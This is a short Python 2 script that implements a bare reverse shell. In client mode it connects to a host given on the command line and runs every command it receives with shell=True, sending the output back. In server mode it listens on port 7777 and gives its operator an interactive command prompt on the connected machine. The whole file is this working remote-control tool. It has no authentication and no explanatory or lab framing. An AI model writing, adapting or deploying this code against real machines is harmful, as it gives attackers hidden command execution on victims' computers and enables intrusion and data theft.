#!/usr/bin/env python2

import socket
import sys
import os

import subprocess
import SocketServer
import threading

from select import select

class Server(object):
  def __init__(self, host='0.0.0.0', port=7777):
    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    self.socket.bind((host, port))
    self.socket.listen(1)

  def accept(self):
    print 'Awaiting connection...'
    self.connection, self.address = self.socket.accept()
    self.client_hostname = self.connection.recv(1024)

  def handle(self):
    while 1:
      cmd = raw_input(self.address[0] + '@' + self.client_hostname + "> ")
      if cmd == 'quit':
        self.connection.close()
        self.socket.close()
      self.connection.send(cmd)
      result = self.connection.recv(16834)
      if result:
        print result

class Client(object):
  def __init__(self, host, port=7777):
    self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.socket.connect((host, port))
    self.socket.send(socket.gethostname())

  def handle(self):
    while 1:
      cmd = self.socket.recv(1024)
      if cmd == 'quit':
        self.socket.close()
        print 111
        break
      if not cmd:
        print 222
        break

      pid = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                             stderr=subprocess.STDOUT)
      self.socket.send(pid.stdout.read())

class Server2(SocketServer.TCPServer):
  def __init__(self, *args, **kwargs):
    SocketServer.TCPServer.__init__(self, *args, **kwargs)
    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

class ServerHandle(SocketServer.BaseRequestHandler):
  def handle(self):

    data = True
    while data and self.loop:
      r,_,_ = select([self.request], [], [], 100)

      if r:
        data = self.request.recv(1024)
        sys.stdout.write(data)


  def _setup(self):
    while self.loop:
      cmd = raw_input(self.hostname + '@' + self.client_address[0] + "> ")
      if cmd == 'quit':
        self.request.close()
        sys.exit()
      self.request.send(cmd)

  def setup(self):
    self.hostname = self.request.recv(1024)
    self.loop = True
    self.repl = threading.Thread(target=self._setup)
    self.repl.start()

  def finish(self):
    self.loop = False
    print 'Disconnected'


if __name__=='__main__':
  if sys.argv[1] == '-s':
    #s = Server()
    #s.accept()
    #s.handle()
    s = Server2(('0.0.0.0', 7777), ServerHandle)
    s.serve_forever()
  else:
    c = Client(sys.argv[1])
    c.handle()
